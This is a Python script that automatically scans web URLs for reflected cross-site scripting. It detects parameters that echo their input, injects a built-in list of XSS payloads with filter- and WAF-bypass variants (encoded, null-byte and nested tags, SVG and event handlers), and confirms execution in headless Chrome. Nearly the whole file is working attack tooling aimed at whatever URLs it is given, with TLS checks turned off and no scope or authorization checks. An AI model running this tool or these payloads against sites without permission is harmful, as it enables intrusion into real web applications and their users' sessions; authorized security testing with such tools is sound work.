#!/usr/bin/env python3

import argparse
import requests
import urllib.parse
import random
import string
import re
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoAlertPresentException, TimeoutException
from selenium.webdriver.chrome.options import Options
import urllib3
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Suppress only the single warning from urllib3 needed.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define XSS payloads with WAF bypass techniques
XSS_PAYLOADS = [
    # Simple Payloads
    "<script>alert('XSS')</script>",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
    
    # Attribute-Based
    "\"><script>alert('XSS')</script>",
    "'\"><img src=x onerror=alert('XSS')>",
    "';alert('XSS');//",
    
    # SVG and Other Tags
    "<svg/onload=alert('XSS')>",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<body onload=alert('XSS')>",
    
    # Alternative Encodings
    "<scr\0ipt>alert('XSS')</scr\0ipt>",
    "<scr&#x69;pt>alert('XSS')</scr&#x69;pt>",
    "<scri%00pt>alert('XSS')</scri%00pt>",
    
    # Double Encoding
    "%253Cscript%253Ealert('XSS')%253C/script%253E",
    
    # Polyglots
    "<svg><script>alert('XSS')</script></svg>",
    "<math href=\"javascript:alert('XSS')\">X</math>",
    
    # Event Handlers
    "<div onmouseover=\"alert('XSS')\">Hover me!</div>",
    "<input type=\"text\" value=\"\"><script>alert('XSS')</script>",
    
    # Miscellaneous
    "<details open ontoggle=alert('XSS')></details>",
    "<video><source onerror=\"alert('XSS')\">",
]

def generate_random_string(length=8):
    """Generates a random alphanumeric string."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def inject_random_values(url):
    """
    Replaces parameter values with random strings.
    Returns the modified URL and a mapping of parameters to random values.
    """
    parsed_url = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed_url.query)
    random_params = {}
    for param in params:
        random_params[param] = generate_random_string()
    encoded_params = urllib.parse.urlencode(random_params, doseq=True)
    modified_url = urllib.parse.urlunparse(parsed_url._replace(query=encoded_params))
    return modified_url, random_params

def inject_payloads(url, payloads):
    """
    Injects payloads into the URL parameters.
    Returns a list of tuples containing (payload_url, parameter, payload).
    """
    parsed_url = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed_url.query)
    payload_urls = []

    for param in params:
        for payload in payloads:
            modified_params = params.copy()
            modified_params[param] = payload
            encoded_params = urllib.parse.urlencode(modified_params, doseq=True)
            payload_url = urllib.parse.urlunparse(parsed_url._replace(query=encoded_params))
            payload_urls.append((payload_url, param, payload))
    
    return payload_urls

def detect_reflections(url):
    """
    Detects which parameters in a URL reflect injected values.
    Returns a list of tuples containing (original_url, parameter).
    """
    modified_url, random_params = inject_random_values(url)
    try:
        response = requests.get(modified_url, timeout=10, verify=False)
        reflected = []
        for param, random_value in random_params.items():
            if random_value in response.text:
                reflected.append((url, param))
        return reflected
    except requests.exceptions.RequestException as e:
        print(f"[Error] Accessing {modified_url}: {e}")
        return []

def is_payload_reflected(payload, response_text):
    """Checks if the payload is reflected in the response."""
    return payload in response_text

def contains_xss_indicators(response_text):
    """
    Checks for indicators of XSS execution.
    Currently looks for 'alert('XSS')' or 'confirm('XSS')' in the response.
    """
    alert_pattern = re.compile(r'alert\(["\']XSS["\']\)', re.IGNORECASE)
    confirm_pattern = re.compile(r'confirm\(["\']XSS["\']\)', re.IGNORECASE)
    return bool(alert_pattern.search(response_text) or confirm_pattern.search(response_text))

def detect_xss(url, param):
    """
    Injects XSS payloads into a specific parameter of a URL and checks for potential XSS.
    Returns a tuple containing (payload_url, parameter, payload) if XSS is found, else None.
    """
    payload_urls = inject_payloads(url, XSS_PAYLOADS)
    for payload_url, injected_param, payload in payload_urls:
        if injected_param != param:
            continue  # Only test the relevant parameter
        try:
            response = requests.get(payload_url, timeout=10, verify=False)
            if is_payload_reflected(payload, response.text):
                if contains_xss_indicators(response.text):
                    return (payload_url, injected_param, payload)
        except requests.exceptions.RequestException as e:
            print(f"[Error] Accessing {payload_url}: {e}")
    return None

def verify_xss_with_selenium(url):
    """
    Uses Selenium to verify if the payload execution triggers an alert.
    Returns True if XSS is confirmed, False otherwise.
    """
    chrome_options = Options()
    chrome_options.add_argument("--headless")  # Run in headless mode
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    
    try:
        driver = webdriver.Chrome(options=chrome_options)
    except Exception as e:
        print(f"[Error] Initializing Selenium WebDriver: {e}")
        return False

    try:
        driver.set_page_load_timeout(15)
        driver.get(url)
        time.sleep(2)  # Wait for the page to load

        # Check for alerts
        try:
            alert = driver.switch_to.alert
            alert_text = alert.text
            if "XSS" in alert_text:
                alert.accept()
                driver.quit()
                return True
        except NoAlertPresentException:
            pass

        # Additional checks can be implemented here
    except TimeoutException:
        print(f"\n[Warning] Timeout loading {url}")
    except Exception as e:
        print(f"\n[Error] Selenium error on {url}: {e}")
    finally:
        driver.quit()
    return False

def process_vulnerability(vuln):
    """
    Processes a single vulnerability by verifying it with Selenium.
    Returns the vulnerability tuple if confirmed, else None.
    """
    url, param, payload = vuln
    print(f"\n[+] Verifying XSS on {url} | Parameter: {param} | Payload: {payload}")
    if verify_xss_with_selenium(url):
        print(f"{Fore.RED}[!!] XSS Confirmed on {url} | Parameter: {param} | Payload: {payload}{Style.RESET_ALL}")
        return vuln
    else:
        print(f"[-] No XSS detected for payload on {url} | Parameter: {param}")
        return None

def main(input_file, output_file, max_workers):
    # Read URLs from the input file
    try:
        with open(input_file, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[Error] Input file '{input_file}' not found.")
        return
    except Exception as e:
        print(f"[Error] Unable to read input file '{input_file}': {e}")
        return

    if not urls:
        print("[Error] No URLs found in the input file.")
        return

    # Stage 1: Detect Reflections using Multithreading
    print("[*] Stage 1: Detecting Reflections")
    reflected = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(detect_reflections, url): url for url in urls}
        for future in tqdm(as_completed(futures), total=len(futures), desc="Detecting Reflections", unit="url"):
            result = future.result()
            if result:
                reflected.extend(result)
    print(f"[*] Stage 1 Completed: Found {len(reflected)} reflected parameter(s).")

    if not reflected:
        print("[*] No reflections detected. Exiting.")
        return

    # Stage 2: Inject XSS Payloads using Multithreading
    print("\n[*] Stage 2: Injecting XSS Payloads")
    vulnerabilities = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(detect_xss, url, param): (url, param) for url, param in reflected}
        for future in tqdm(as_completed(futures), total=len(futures), desc="Injecting XSS Payloads", unit="vuln"):
            result = future.result()
            if result:
                vulnerabilities.append(result)
    print(f"[*] Stage 2 Completed: Found {len(vulnerabilities)} potential XSS vulnerability(ies).")

    if not vulnerabilities:
        print("[*] No potential XSS vulnerabilities found. Exiting.")
        return

    # Stage 3: Verify XSS with Selenium (Serial Processing)
    print("\n[*] Stage 3: Verifying XSS with Selenium")
    confirmed_vulnerabilities = []
    for vuln in tqdm(vulnerabilities, desc="Verifying XSS", unit="vuln"):
        confirmed = process_vulnerability(vuln)
        if confirmed:
            confirmed_vulnerabilities.append(confirmed)
    
    print(f"\n[*] Stage 3 Completed: Confirmed {len(confirmed_vulnerabilities)} XSS vulnerability(ies) using Selenium.")

    # Report vulnerabilities
    if confirmed_vulnerabilities:
        try:
            with open(output_file, 'w') as f:
                for vuln in confirmed_vulnerabilities:
                    f.write(f"URL: {vuln[0]}, Parameter: {vuln[1]}, Payload: {vuln[2]}\n")
            print(f"\n[*] Confirmed vulnerabilities have been saved to '{output_file}'.")
        except Exception as e:
            print(f"[Error] Unable to write to output file '{output_file}': {e}")
    else:
        print("[*] No confirmed XSS vulnerabilities found.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Automated XSS Detection Script with Optimized Logic, Colored Output, and Multithreading")
    parser.add_argument('-i', '--input', required=True, help='Path to the input file containing URLs to test')
    parser.add_argument('-o', '--output', required=True, help='Path to the output file to save confirmed XSS vulnerabilities')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of concurrent threads (default: 10)')
    args = parser.parse_args()

    main(args.input, args.output, args.threads)
